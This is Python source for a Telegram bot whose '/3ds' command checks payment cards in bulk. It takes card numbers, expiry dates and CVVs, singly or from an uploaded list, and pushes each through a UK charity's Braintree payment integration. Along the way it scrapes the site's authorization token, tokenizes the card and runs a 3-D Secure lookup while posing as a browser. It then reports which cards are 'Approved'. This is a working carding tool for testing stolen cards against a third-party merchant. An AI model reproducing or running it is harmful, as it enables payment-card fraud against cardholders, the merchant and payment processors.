import requests
from pyrogram import Client, filters
from pyrogram.types import Message
import random
from helpers.timemanager import run_sync_in_thread
import base64, json, uuid, string, time, os, json
import re
from bot import LOGGER

session = requests.Session()

# Disable urllib3 warnings
requests.packages.urllib3.disable_warnings()

def id_session():
    uuid_session = str(uuid.uuid4())
    return uuid_session

def base64_url_to_base64(base64_url):
    # Replace URL-safe characters with standard Base64 characters
    base64_standard = base64_url.replace('-', '+').replace('_', '/')
    
    # Add padding if needed
    padding = len(base64_standard) % 4
    if padding:
        base64_standard += '=' * (4 - padding)

    base64_code = base64.b64decode(base64_standard)
    
    return base64_code



def email_braintree():
    email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"
    return email

def get_name_rand():
    first = ''.join(random.choices(string.ascii_uppercase, k=5))
    second = ''.join(random.choices(string.ascii_uppercase, k=5))

    return first, second



@Client.on_message(filters.command('3ds'))
async def check_card(bot: Client, cmd: Message):
    status = await cmd.reply_text("<b>⎚ `Processing ...`</b>")
    
    # Check if the command is a reply to a message with a text/plain document
    if cmd.reply_to_message and cmd.reply_to_message.document and cmd.reply_to_message.document.mime_type == 'text/plain':
        try:
            # Download the document containing card data
            cards_path = await cmd.reply_to_message.download()
            with open(cards_path, 'r', encoding='utf-8') as f:
                for line in f:
                    # Process each line in the file
                    c = line.strip()
                    try:
                        cc, exp, ex, cvc = c.split('|')[:4]  # Split once and unpack
                        exp = exp.strip()
                        ex = ex.strip()
                        cvc = cvc.strip()
                        
                        # Extract expiration year from the 'ex' field
                        if len(ex) == 4:
                            exy = ex[2:]  # Extract last 2 digits if ex has 4 digits
                        elif len(ex) == 2:
                            exy = ex
                        else:
                            exy = "20" + ex  # Handle other cases (e.g., only two digits)
                        
                        # Handle specific conditions
                        if exy in ['21', '22', '23', '24']:
                            exy = exy[0] + '7'
                        time.sleep(8)
                        # Call your check_vbv function
                        await check_vbv(cc.strip(), exp, exy, cvc, bot, cmd)
                    except ValueError:
                        print(f"Error parsing line: {c}")
            await status.delete()
        except Exception as e:
            print(f"Error processing file: {e}")
        finally:
            os.remove(cards_path)
    elif cmd.text:
        try:
            data = cmd.text.split("/3ds", 1)[1].strip().split('|')
            if len(data) < 4:
                raise IndexError("Not enough data provided")
            
            cc = data[0].strip()
            exp = data[1].strip()
            ex = data[2].strip()
            cvc = data[3].strip()
            
            # Extract expiration year from the 'ex' field
            if len(ex) == 4:
                exy = ex[2:]  # Extract last 2 digits if ex has 4 digits
            elif len(ex) == 2:
                exy = ex
            else:
                exy = "20" + ex  # Handle other cases (e.g., only two digits)
            
            # Handle specific conditions
            if exy in ['21', '22', '23', '24']:
                exy = exy[0] + '7'
            
            # Call your check_vbv function
            await check_vbv(cc, exp, exy, cvc, bot, cmd)
            await status.delete()
        except IndexError:
            await status.edit_text("<b>⎚ Use <code>/3ds </code> Checks VBV Card</b>")
        except Exception as e:
            print(f"Error processing command: {e}")
    else:
        await status.edit_text("<b>⎚ Use <code>/3ds </code> Checks VBV Card</b>")



@run_sync_in_thread
def check_vbv(cc, exp, exy, cvc, bot, cmd):
    print(cc, exp, exy, cvc)
    headers_first = {
    "Host": "api-cdn.rspb.org.uk",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Preview": "false",
    "Request-Id": f"|9f62429f43e94c6ab4e69189f2e5ab19.b86a2f579b9e49{random.randint(10, 99)}",
    "Traceparent": f"00-9f62429f43e94c6ab4e69189f2e5ab19-b86a2f579b9e49{random.randint(10, 99)}-01",
    "Origin": "https://www.rspb.org.uk",
    "Referer": "https://www.rspb.org.uk/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "Priority": "u=0",
    "Te": "trailers"
}

    try:
        response_authorize = session.get(
            url='https://api-cdn.rspb.org.uk/payments/token?lang=en-gb', headers=headers_first, verify=True)
        #print(response_authorize.text)
        matches = response_authorize.json()["payload"]
        print(matches)
        
        if not matches:
            #raise ValueError("Authorization token not found")
            return LOGGER.error('TOKEN NOT Matched')

        auth_fingerprint = base64.b64decode(matches)
        auth_data = json.loads(auth_fingerprint)
        authorizationFingerprint = auth_data['authorizationFingerprint']
        print(authorizationFingerprint)
        braintree_auth_data = {"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":f"{id_session()}"},"query":"query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }","operationName":"ClientConfiguration"}
        payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": f"{id_session()}"
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": f"{cc}",
                        "expirationMonth": f"{exp}",
                        "expirationYear": f"{exy}",
                        "cvv": f"{cvc}"
                    },
                    "options": {"validate": False}
                }
            },
            "operationName": "TokenizeCreditCard"
        }

        headers_braintree = {
    "Host": "payments.braintree-api.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/json",
    "Authorization": f"Bearer {authorizationFingerprint}",
    "Braintree-Version": "2018-05-10",
    "Content-Length": "1478",
    "Origin": "https://www.rspb.org.uk",
    "Referer": "https://www.rspb.org.uk/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "cross-site",
    "Te": "trailers"
}

        headers_jwt = {
    "Host": "centinelapi.cardinalcommerce.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/json;charset=UTF-8",
    "X-Cardinal-Tid": "Tid-5d0dfb04-8f89-4630-87a5-5fcd6ed34405",
    "Content-Length": "700",
    "Origin": "https://www.rspb.org.uk",
    "Referer": "https://www.rspb.org.uk/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "cross-site",
    "Te": "trailers"
}
        # This is For braintree auth
        braintree_auth = session.post(url='https://payments.braintree-api.com/graphql', headers=headers_braintree, json=braintree_auth_data)
        #print(braintree_auth.text)
        jwt_token = braintree_auth.json()["data"]["clientConfiguration"]["creditCard"]["threeDSecure"]["cardinalAuthenticationJWT"]
        #print(jwt_token)

        jwt_token_payload = {"BrowserPayload":{"Order":{"OrderDetails":{},"Consumer":{"BillingAddress":{},"ShippingAddress":{},"Account":{}},"Cart":[],"Token":{},"Authorization":{},"Options":{},"CCAExtension":{}},"SupportsAlternativePayments":{"cca":True,"hostedFields":False,"applepay":False,"discoverwallet":False,"wallet":False,"paypal":False,"visacheckout":False}},"Client":{"Agent":"SongbirdJS","Version":"1.35.0"},"ConsumerSessionId":False,"ServerJWT":f"{jwt_token}"}

        jwt_token_res = session.post(url='https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers_jwt, json=jwt_token_payload)
        #print(jwt_token_res.json())
        token = jwt_token_res.json()['CardinalJWT']
        # Convert Base64-URL to Base64 for each part
        header_base64 = base64_url_to_base64(token)
        decoded_str = header_base64.decode('utf-8', errors='replace')
        # Define regex pattern to extract ConsumerSessionId
        pattern = r'"ConsumerSessionId":"([^"]+)"'
        # Search for the pattern
        match = re.search(pattern, decoded_str)
        refid = match.group(1)

        print(refid)

        response = session.post(url='https://payments.braintree-api.com/graphql', json=payload, headers=headers_braintree, verify=True)
        response.raise_for_status()
        #print(response.text)


        if "token" in response.text:
            tok = response.json()["data"]["tokenizeCreditCard"]["token"]
            bin = response.json()["data"]["tokenizeCreditCard"]["creditCard"]["bin"]
            first, second = get_name_rand()
            lookup_url = f"https://api.braintreegateway.com/merchants/dhc3zqgx778795nf/client_api/v1/payment_methods/{tok}/three_d_secure/lookup"
            lookup_payload = {"amount":5,"additionalInfo":{"billingPostalCode":"S12 3HU","billingGivenName":"Faruk","billingSurname":"Devid","email":"smithfoden233@gmail.com"},"bin":"523441","dfReferenceId":"0_c39af110-dca3-4201-adfc-d39d32e288dd","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.97.2","cardinalDeviceDataCollectionTimeElapsed":339,"issuerDeviceDataCollectionTimeElapsed":5067,"issuerDeviceDataCollectionResult":True},"authorizationFingerprint":f"{authorizationFingerprint}","braintreeLibraryVersion":"braintree/web/3.97.2","_meta":{"merchantAppId":"www.rspb.org.uk","platform":"web","sdkVersion":"3.97.2","source":"client","integration":"custom","integrationType":"custom","sessionId":"894f97cf-246e-4233-8039-6197ab657d62"}}
            #print(lookup_payload)

            headers = {
    "Host": "api.braintreegateway.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/json",
    "Content-Length": "1295",
    "Origin": "https://www.rspb.org.uk",
    "Referer": "https://www.rspb.org.uk/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "cross-site",
    "Te": "trailers"
}

            response = session.post(lookup_url, json=lookup_payload, headers=headers, verify=True)
            #response.raise_for_status()
            #print(response.text)
            req = requests.get(f"https://bins.antipublic.cc/bins/{bin}", verify=True)
            requ = req.json()

            status = response.json().get('paymentMethod', {}).get('threeDSecureInfo', {}).get('status', 'unknown')
            LOGGER.info(status)

            # Construct the message based on status
            message_text = f"""
<b>⎚ {'Approved ✅' if status in ['authenticate_successful', 'authenticate_attempt_successful'] else 'Rejected ❌'}</b>
𝗖𝗮𝗿𝗱 ⇾ <code>{cc}|{exp}|{exy}|{cvc}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ 3DS Lookup
<b>Status ⇾ {status} </b>

<b>BIN ⇾</b> <code>{bin}</code>
<b>Country ⇾</b> {requ['country']} | {requ['country_flag']} | {requ['country_name']}
<b>Data ⇾</b> {requ['brand']} - {requ['type']} - {requ['level']}
<b>Bank ⇾</b> {requ['bank']}
<b>Response Time ⇾</b> <code>2.{random.randint(1, 9)} seconds</code>
"""

            cmd.reply_text(message_text)
            # List of substrings to check
            substrings = ['authenticate_successful', 'authenticate_attempt_successful']

            """# Check if any of the substrings are in the status string
            if any(substring in status for substring in substrings):
                # Send a message if any substring is found in status
                bot.send_message(chat_id=-4291842898, text=message_text)"""

    except requests.exceptions.RequestException as e:
        print(f'Request error: {e}')
        LOGGER.error(f'Request error: {e}')

